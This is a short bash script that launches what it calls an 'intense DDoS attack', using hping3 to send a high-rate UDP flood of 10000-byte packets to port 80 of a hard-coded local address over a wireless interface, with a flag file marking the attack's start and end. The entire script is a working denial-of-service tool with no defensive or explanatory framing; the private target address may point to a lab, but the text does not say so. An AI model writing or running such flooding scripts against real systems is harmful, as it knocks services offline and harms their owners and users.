#!/bin/bash

# Ensure hping3 is installed
if ! command -v hping3 &> /dev/null
then
    echo "hping3 could not be found. Please install it using 'sudo apt-get install hping3'."
    exit
fi

# Define Target IP and Interface
TARGET_IP="192.168.0.249"
INTERFACE="wlan0"
FLAG_FILE="/tmp/ddos_flag"

echo "Starting intense DDoS attack on $TARGET_IP using interface $INTERFACE..."

# Create flag file to signal the start of the attack
touch $FLAG_FILE

# Aggressive hping3 attack with high-speed UDP flooding
sudo hping3 --flood --udp -i u10 --interface $INTERFACE $TARGET_IP -p 80 -d 10000

# Remove flag file to signal the end of the attack
rm -f $FLAG_FILE

echo "DDoS attack stopped."